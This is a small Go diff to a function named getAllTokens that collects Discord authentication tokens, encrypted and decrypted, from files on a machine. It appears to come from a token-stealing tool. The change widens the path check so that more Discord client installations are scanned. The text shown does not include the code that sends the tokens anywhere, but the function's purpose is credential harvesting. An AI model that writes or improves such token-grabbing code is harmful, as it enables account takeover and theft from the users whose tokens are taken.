@@ -351,11 +351,12 @@ func getAllTokens() {
 
 			for _, line := range lines {
 
-				if pathName == "Discord" {
+				if strings.Contains(pathName, "Discord") {
 					searchEncryptedToken(line, &tokenList)
 				} else {
 					searchDecryptedToken(line, &tokenList)
 				}
+
 			}
 		}
 	}
